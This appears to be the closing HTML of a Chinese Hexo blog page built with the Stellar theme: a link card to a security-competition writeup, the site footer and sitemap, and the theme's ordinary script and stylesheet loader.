data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/05/20/664abdea520d8.jpeg"></div><span class="title">第十七届全国大学生信息安全竞赛创新实践能力赛初赛 Writeup</span></a></div></section></div>
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">RSS</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs14">Support</span><a target="_blank" rel="noopener" href="https://blog.mhuig.top/">博客</a><a target="_blank" rel="noopener" href="https://api.mhuig.top/">API</a><a target="_blank" rel="noopener" href="https://ssl.mhuig.top/">SSL Status</a><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mhuig.instatus.com/">Status Monitors</a></div><div class="sitemap-group"><span class="fs14">社交</span><a target="_blank" rel="noopener" href="https://blog.mhuig.top/pages/friends/">友链</a><a target="_blank" rel="noopener" href="https://blog.mhuig.top/pages/about/">留言板</a></div><div class="sitemap-group"><span class="fs14">更多</span><a target="_blank" rel="noopener" href="https://mhuig.top/">关于我</a><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/MHuiG">GitHub</a><a href="/contact/">Contact</a><a href="/privacy-policy/">隐私政策</a></div></div><div class="text"><p>本站由 <a target="_blank" rel="noopener" href="https://mhuig.top/">MHuiG</a> 使用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建，您可以在 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/MHG-LAB/RSSBOX">GitHub</a> 找到本站源码<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/me-shaon/GLWTPL/blob/master/translations/LICENSE_zh-CN">GLWT（Good Luck With That，祝你好运）公共许可证</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class="float-panel mobile-only blur" style="display:none">
+  <button type="button" class="sidebar-toggle mobile" onclick="sidebar.toggle()">
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewbox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"/><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"/></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class="scripts">
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.9.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://static.mhuig.top/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://static.mhuig.top/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://static.mhuig.top/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://static.mhuig.top/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://static.mhuig.top/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://static.mhuig.top/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://static.mhuig.top/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img,article.content img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
